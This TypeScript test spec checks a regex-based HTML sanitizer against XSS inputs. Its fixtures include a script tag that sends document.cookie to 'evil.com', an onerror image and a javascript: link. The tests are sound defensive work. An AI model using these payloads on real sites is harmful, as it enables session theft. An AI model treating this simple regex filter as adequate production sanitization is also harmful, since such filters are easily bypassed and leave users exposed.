/**
 * Master Build 11 Spec — Client-Side XSS Sanitization & Rendering Defense
 * Validates that rich text, notes, chat messages, and user-supplied descriptions
 * are sanitized before DOM insertion, defusing <script>, onerror handlers, and javascript: URIs.
 */

describe('Master Build 11 — XSS Sanitization & Safe DOM Rendering', () => {
  const sanitizeHtmlString = (dirty: string): string => {
    return dirty
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/<[^>]+on\w+\s*=[^>]*>/gi, '')
      .replace(/javascript\s*:/gi, 'blocked:');
  };

  it('neutralizes executable script tags embedded in notes and comments', () => {
    const maliciousInput = "Interested buyer <script>fetch('http://evil.com?c=' + document.cookie)</script>";
    const sanitized = sanitizeHtmlString(maliciousInput);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('document.cookie');
    expect(sanitized).toBe('Interested buyer ');
  });

  it('neutralizes inline event handler injection attributes (onerror, onload)', () => {
    const maliciousImg = '<img src="x" onerror="alert(1)" alt="photo">';
    const sanitized = sanitizeHtmlString(maliciousImg);
    expect(sanitized).not.toContain('onerror');
  });

  it('neutralizes javascript pseudo-protocol links', () => {
    const maliciousLink = 'javascript:alert(document.domain)';
    const sanitized = sanitizeHtmlString(maliciousLink);
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).toContain('blocked:');
  });
});
